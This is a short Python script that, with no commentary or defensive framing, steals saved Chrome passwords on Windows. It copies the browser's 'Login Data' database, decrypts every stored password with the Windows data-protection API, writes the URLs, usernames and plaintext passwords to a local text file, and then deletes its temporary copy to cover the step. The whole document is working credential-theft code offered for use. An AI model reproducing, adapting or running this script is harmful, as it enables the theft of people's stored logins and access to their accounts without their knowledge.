import os, sqlite3, win32crypt, time, shutil, sys
file = open("saksham.txt", "w")
file.write("")
file.close
def logit(content):
    file = open("saksham.txt", "a")
    file.write(content)
    file.close
shutil.copyfile(os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default/Login Data", "tempdatabase")
path = os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default"
db = os.path.join(os.path.abspath(os.path.split(sys.argv[0])[0]) + "/tempdatabase")
c = sqlite3.connect(db)
cursor = c.cursor()
select_statement = "SELECT origin_url, username_value, password_value FROM logins"
cursor.execute(select_statement)
login_data = cursor.fetchall()
outputlist = []
for url, user_name, pwd, in login_data:
    pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
    if url != "" and user_name != "" and pwd[1].decode('utf-8') != "":
        outputlist.append(url)
        outputlist.append(user_name)
        outputlist.append(pwd[1].decode('utf-8'))
        outputlist.append("")  
for item in outputlist:
    try:
        logit(item + "\n")
    except:
        doing = "nothing"      
c.close()
os.remove(os.path.abspath(os.path.split(sys.argv[0])[0]) + "\\tempdatabase")